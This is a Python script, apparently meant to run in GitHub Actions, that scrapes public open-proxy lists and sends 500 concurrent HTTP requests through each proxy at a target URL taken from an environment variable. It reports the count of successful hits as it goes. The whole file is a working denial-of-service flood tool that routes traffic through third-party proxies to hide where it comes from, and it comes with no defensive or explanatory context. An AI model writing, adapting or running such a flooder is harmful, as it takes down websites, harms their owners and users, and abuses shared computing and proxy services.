import asyncio
import aiohttp
import os
import re
from rich.console import Console

console = Console()

class SparxCloud:
    def __init__(self):
        self.proxies = set()
        self.stats = {"success": 0, "failed": 0}
        # Pulls the URL from the GitHub Actions input box
        self.target_url = os.environ.get("TARGET_URL", "")
        self.sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
        ]

    async def fetch_proxies(self, session):
        for url in self.sources:
            try:
                async with session.get(url, timeout=10) as resp:
                    text = await resp.text()
                    self.proxies.update(re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', text))
            except: continue
        print(f"Loaded {len(self.proxies)} Global Proxies")

    async def burst(self, session, proxy):
        proxy_url = f"http://{proxy}"
        tasks = [session.get(self.target_url, proxy=proxy_url, timeout=5) for _ in range(500)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, aiohttp.ClientResponse) and r.status == 200:
                self.stats["success"] += 1
            else:
                self.stats["failed"] += 1

    async def start(self):
        if not self.target_url:
            print("ERROR: No Target URL found in environment variables!")
            return

        async with aiohttp.ClientSession() as session:
            await self.fetch_proxies(session)
            print(f"Launching Nitro Burst on {self.target_url}")
            # Loop through all scraped proxies once
            for p in list(self.proxies):
                await self.burst(session, p)
                print(f"Hits: {self.stats['success']} | Failed: {self.stats['failed']}")

if __name__ == "__main__":
    bot = SparxCloud()
    asyncio.run(bot.start())
